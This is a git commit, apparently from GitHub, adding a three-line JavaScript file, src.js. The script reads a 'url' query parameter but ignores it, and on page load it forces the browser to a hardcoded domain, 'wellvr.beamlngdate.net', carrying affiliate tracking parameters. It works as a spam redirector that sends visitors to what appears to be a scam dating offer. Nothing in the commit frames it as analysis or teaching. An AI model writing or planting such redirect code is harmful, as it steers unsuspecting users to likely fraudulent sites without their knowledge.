682032dcb1d3ae1712817f6918c6c4410b7253cc
enjoy06 <152522310+enjoy06@users.noreply.github.com>
2025-03-01 00:04:34 +0700

    Add files via upload

---
+++ src.js
@@ -0,0 +1,3 @@
+const looking = new URLSearchParams(window.location.search);
+const directed = looking.get('url');
+window.location.href = 'https://wellvr.beamlngdate.net/?utm_source=da57dc555e50572d&s1=99207&s2=1311562&click_id=SOLUSIE&j1=1';
